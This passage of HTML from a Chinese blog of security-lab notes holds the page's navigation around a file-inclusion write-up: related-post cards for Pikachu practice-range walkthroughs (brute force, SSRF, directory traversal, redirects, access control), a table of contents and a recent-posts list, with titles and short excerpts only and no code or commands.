class="info-item-2">Pikachu靶场通关：Brute Force</div></div><div class="info-2"><div class="info-item-1">皮卡丘（Pikachu）第一关「暴力破解」通关记录 实验环境：Windows 10 + Pikachu + Burp Suite Community  + ffuf靶场地址：http://127.0.0.1/pikachu/     本次记录皮卡丘靶场第一关「暴力破解」的完整通关过程。这一关共四个递进的小关卡，每一关都在前一关的基础上加了一层”看起来有用”的防护；  打完四关之后回到源码，分...</div></div></div></a><a class="pagination-related" href="/2026/11/26/Pikachu-SSRF/" title="Pikachu靶场通关：SSRF"><img class="cover" src="/img/cover-2.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-11-26</div><div class="info-item-2">Pikachu靶场通关：SSRF</div></div><div class="info-2"><div class="info-item-1">皮卡丘（Pikachu）SSRF 通关记录 实验环境：Windows 10 + Pikachu + Burp Suite靶场地址：http://127.0.0.1/pikachu/   本次记录皮卡丘靶场 SSRF 模块两个关卡的通关过程。这一关的输入是一个 URL，服务器拿它去发请求、再把结果还给我们——等于借服务器的身份，在它自己的网络位置上替我们”点一次链接”。   一、SSRF1.1...</div></div></div></a><a class="pagination-related" href="/2026/11/26/Pikachu-Dir-Traversal-Info-Leak/" title="Pikachu靶场通关：目录遍历与信息泄露"><img class="cover" src="/img/cover-2.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-11-26</div><div class="info-item-2">Pikachu靶场通关：目录遍历与信息泄露</div></div><div class="info-2"><div class="info-item-1">皮卡丘（Pikachu）目录遍历与敏感信息泄露通关记录 实验环境：Windows 10 + Pikachu + Burp Suite靶场地址：http://127.0.0.1/pikachu/   本次记录皮卡丘靶场 Directory Traversal（目录遍历）与 Sensitive Information Leak（敏感信息泄露）两个模块的通关过程。这两个漏洞危害等级都不高，但性质不...</div></div></div></a><a class="pagination-related" href="/2026/11/26/Pikachu-URL-Redirect/" title="Pikachu靶场通关：URL重定向"><img class="cover" src="/img/cover-5.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-11-26</div><div class="info-item-2">Pikachu靶场通关：URL重定向</div></div><div class="info-2"><div class="info-item-1">皮卡丘（Pikachu）URL 重定向通关记录 实验环境：Windows 10 + Pikachu + Burp Suite   本次记录皮卡丘靶场 Unsafe URL Redirect（不安全的 URL 跳转）模块的通关过程。这一关的输入是一个跳转目标，改掉它，页面就跳去了别的地方——漏洞本身不复杂，麻烦的是它常被用来做钓饵，或者当成绕过白名单的跳板。   一、URL 重定向1.1 什么...</div></div></div></a><a class="pagination-related" href="/2026/11/26/Pikachu-Overpermission/" title="Pikachu靶场通关：越权"><img class="cover" src="/img/cover-1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-11-26</div><div class="info-item-2">Pikachu靶场通关：越权</div></div><div class="info-2"><div class="info-item-1">皮卡丘（Pikachu）越权通关记录 实验环境：Windows 10 + Pikachu + Burp Suite靶场地址：http://127.0.0.1/pikachu/   本次记录皮卡丘靶场 Over Permission（越权）模块两个关卡的通关过程。越权不是一个”技术点”，而是一个”校验点”：功能本身没写错，错在该校验的地方没校验。水平越权是横向借别人的数据，垂直越权是纵向借别人...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Qu0rtz-blip</div><div class="author-info-description">信息安全学习笔记 · CTF 与漏洞复现</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">60</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Qu0rtz-blip"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Qu0rtz-blip" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客，这里记录 CTF 与漏洞复现的学习过程 📝</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9A%AE%E5%8D%A1%E4%B8%98%EF%BC%88Pikachu%EF%BC%89%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">皮卡丘（Pikachu）文件包含通关记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.1.</span> <span class="toc-text">一、文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E4%BB%80%E4%B9%88%E6%98%AF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.1 什么是文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E5%85%B3%E5%8D%A1%E5%85%A5%E5%8F%A3"><span class="toc-number">1.1.2.</span> <span class="toc-text">1.2 关卡入口</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95"><span class="toc-number">1.2.</span> <span class="toc-text">二、通关记录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.2.1.</span> <span class="toc-text">2.1 本地文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1-%E5%85%88%E6%AD%A3%E5%B8%B8%E9%80%89%E4%B8%80%E4%B8%AA"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">2.1.1 先正常选一个</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2-%E7%8C%9C%E4%B8%80%E4%B8%AA%E4%B8%8D%E5%9C%A8%E4%B8%8B%E6%8B%89%E6%A1%86%E9%87%8C%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">2.1.2 猜一个不在下拉框里的文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-3-%E8%B7%B3%E5%88%B0%E7%9B%AE%E5%BD%95%E5%A4%96%E9%9D%A2%E5%8E%BB"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">2.1.3 跳到目录外面去</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.2 远程文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E5%A4%B1%E8%B4%A5%E9%95%BF%E4%BB%80%E4%B9%88%E6%A0%B7"><span class="toc-number">1.2.3.</span> <span class="toc-text">2.3 失败长什么样</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9A%E6%BC%8F%E6%B4%9E%E6%98%AF%E6%80%8E%E4%B9%88%E5%86%99%E5%87%BA%E6%9D%A5%E7%9A%84"><span class="toc-number">1.3.</span> <span class="toc-text">三、源码分析：漏洞是怎么写出来的</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E5%85%B3%E5%8D%A1%EF%BC%9A%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E6%8B%BC%E6%8E%A5"><span class="toc-number">1.3.1.</span> <span class="toc-text">3.1 关卡：本地文件包含的拼接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E5%85%B3%E5%8D%A1%EF%BC%9A%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E8%A3%B8%E5%A5%94"><span class="toc-number">1.3.2.</span> <span class="toc-text">3.2 关卡：远程文件包含的裸奔</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number">1.4.</span> <span class="toc-text">四、修复方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="toc-number">1.5.</span> <span class="toc-text">五、免责声明</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/11/26/Pikachu-Dir-Traversal-Info-Leak/" title="Pikachu靶场通关：目录遍历与信息泄露"><img src="/img/cover-2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pikachu靶场通关：目录遍历与信息泄露"/></a><div class="content"><a class="title" href="/2026/11/26/Pikachu-Dir-Traversal-Info-Leak/" title="Pikachu靶场通关：目录遍历与信息泄露">Pikachu靶场通关：目录遍历与信息泄露</a><time datetime="2026-11-26T04:00:00.000Z" title="发表于 2026-11-26 12:00:00">2026-11-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/11/26/Pikachu-Overpermission/" title="Pikachu靶场通关：越权"><img src="/img/cover-1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pikachu靶场通关：越权"/></a><div class="content"><a class="title" href="/2026/11/26/Pikachu-Overpermission/" title="Pikachu靶场通关：越权">Pikachu靶场通关：越权</a><time datetime="2026-11-26T04:00:00.000Z" title="发表于 2026-11-26 12:00:00">2026-11-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/11/26/Pikachu-File-Inclusion/" title="Pikachu靶场通关：文件包含"><img src="/img/cover-5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pikachu靶场通关：文件包含"/></a><div class="content"><a class="title" href="/2026/11/26/Pikachu-File-Inclusion/" title="Pikachu靶场通关：文件包含">Pikachu靶场通关：文件包含</a><time datetime="2026-11-26T04:00:00.000Z" title="发表于 2026-11-26 12:00:00">2026-11-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/11/26/Pikachu-PHP-Unserialize/" title="Pikachu靶场通关：PHP反序列化"><img src="/img/cover-3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pikachu靶场通关：PHP反序列化"/></a><div class="content"><a class="title" href="/2026/11/26/Pikachu-PHP-Unserialize/" title="Pikachu靶场通关：PHP反序列化">Pikachu靶场通关：PHP反序列化</a><time datetime="2026-11-26T04:00:00.000Z" title="发表于 2026-11-26 12:00:00">2026-11-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/11/26/Pikachu-RCE/" title="Pikachu靶场通关：RCE"><img src="/img/cover-6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pikachu靶场通关：RCE"/></a><div class="content"><a class="title" href="/2026/11/26/Pikachu-RCE/" title="Pikachu靶场通关：RCE">Pikachu靶场通关：RCE</a><time datetime="2026-11-26T04:00:00.000Z" title="发表于 2026-11-26 12:00:00">2026-11-26</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Qu0rtz-blip</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.7.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.7.2"></script><script src="/js/main.js?v=5.7.2"></script><div class="js-pjax"></div><script src="/js/click-effect.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
